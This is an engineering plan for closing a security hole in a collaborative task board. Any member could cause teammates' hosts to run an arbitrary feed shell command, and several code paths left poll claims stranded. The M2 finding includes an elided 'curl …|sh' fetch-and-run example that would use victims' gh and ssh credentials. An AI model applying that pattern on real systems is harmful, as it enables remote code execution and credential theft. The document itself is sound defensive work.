# Feed Command Authority and Poll Claims

> **For agentic workers:** REQUIRED SUB-SKILL: Use superpowers:executing-plans to implement this plan task-by-task.

**Goal:** A host runs a feed command only when its own user (or an explicit local approval) stands behind it, and every loss-of-sight path releases the poll claims it strands.

## Context

Findings M2 and M4 from `docs/plans/2026-11-03-codebase-review.md`. M2 is "fix for V8 → still open on create and claim"; M4 is "fix for V6/V9 → sibling paths". Spec first: `docs/specs/feeds.allium` (`FeedCommandAuthority`, `ManualFeedTrigger`), `docs/specs/sync.allium`, `docs/specs/workspaces.allium` change before code, then tests that fail, then code. Mirror module changes in `src/sync/memory_caller/` and cover them in `tests/memory_caller_conformance/`. Signature changes bump `RULES_VERSION` and `BOARD_RULES_VERSION` together; rebuild `module.wasm` and bindings.

## Findings

### 🔴 High — M2: any member can still make a teammate's host run a shell command (`spacetime/module/src/tasks_epics.rs::may_change_feed_command`, `::create_epic`; `visibility.rs::settle_new_epic`; `agent_state.rs::claim_poll_owner`, `::override_poll_owner`; `src/feed/mod.rs::FeedRunner::this_host_polls`; `src/models/poll_action.rs::decide_poll_action`; `src/runtime/epics.rs::exec_trigger_epic_feed`)

**Issue:** 528eb079 gates only `patch_epic`. (a) Bob creates a public root epic with `feed_command = "curl …|sh"`; every member's board that sees it finds no claim, takes `ClaimAndProceed` and runs it with that member's `gh` and ssh credentials. (b) `claim_poll_owner` and `override_poll_owner` check only `require_acting_for(host)`, not sight of `scope_id`. Bob claims Alice's epic for his host, which passes the poll-owner arm of `may_change_feed_command`, rewrites the command, and Alice's host runs it once she takes the claim back. The same call lets anyone take or stall the poll of an epic they cannot see. (c) The manual `r` refresh runs the command on any viewer's host. `FeedCommandAuthority`'s own reason ("changing it is changing what another person's machine runs") is not met.

**Fix (shape decided in the Decisions section):** require sight of `scope_id` in `claim_poll_owner` and `override_poll_owner`; apply `FeedCommandAuthority` at creation; drop the poll-owner arm from `may_change_feed_command`; and choose who may cause a host to run a command.

### 🟡 Medium — M4: three sibling paths still strand poll claims (`spacetime/module/src/visibility.rs::set_epic_visibility_row`; `tasks_epics.rs::patch_epic_row`; `feed.rs::ensure_role_epic`)

**Issue:** public→private flips, re-parenting under a private epic, and the managed-root `make_private` flip (V9) do not call `release_poll_claims`. Scenario: Carol's host polled the formerly shared PR Reviews root; the creator's board flips it private; Carol's `ingest_feed` gets "does not exist", no one else claims, and the feed stalls.

**Fix:** one helper, "release claims of hosts whose owner no longer sees the epic", called from all five loss-of-sight paths (these three plus `move_epic_to_workspace` and `remove_member`). Graduated check: one conformance test that runs every loss-of-sight path against a "poll claims released" assertion, so a new path that forgets the helper fails.

## Decisions

### Who may cause a host to run a feed command (M2)

**Question:** which rule decides that this host runs an epic's `feed_command`?

**Options:**
- (a) Record who last set `feed_command`; a host runs it (auto or manual) only when that setter is the host's owner. Simple and strict; a teammate's feed epic is never polled by your host, so a shared feed needs its setter's host online.
- (b) As (a), plus a local per-host approval of the command's hash (a y/n prompt in the TUI on first sight). Shared feeds still work; needs a new prompt surface and an MCP twin.
- (c) Run a feed only on the hosts of its creator or its followers. Keeps sharing among people who opted in; a follower still runs a command someone else wrote.

Ask the user with `AskUserQuestion` before implementing this finding. Do not pick an option yourself. If the user does not answer, implement only the unconditional parts (sight check on claim/override, authority at creation, drop the poll-owner arm), leave the rest, and say so at wrap-up.

## Changes

| File | Change |
|------|--------|
| `docs/specs/feeds.allium` | `FeedCommandAuthority` at creation; who runs a command; claim/override sight |
| `spacetime/module/src/agent_state.rs` | Sight check in claim/override |
| `spacetime/module/src/tasks_epics.rs` | Authority at create; drop poll-owner arm; release claims on re-parent |
| `spacetime/module/src/visibility.rs`, `feed.rs` | Release claims on visibility flip and managed-root flip |
| `src/feed/mod.rs`, `src/models/poll_action.rs`, `src/runtime/epics.rs` | Run only per the chosen rule |
| `src/sync/memory_caller/` | Mirror |
| `tests/memory_caller_conformance/` | Loss-of-sight → claims released, for every path; claim/override sight refusals |

## Verification

- [ ] New tests fail before the change and pass after
- [ ] `cargo test --no-fail-fast` green
- [ ] Module checks per `docs/testing.md`; `module.wasm` and bindings rebuilt
- [ ] `cargo clippy --all-targets -- -D warnings` clean
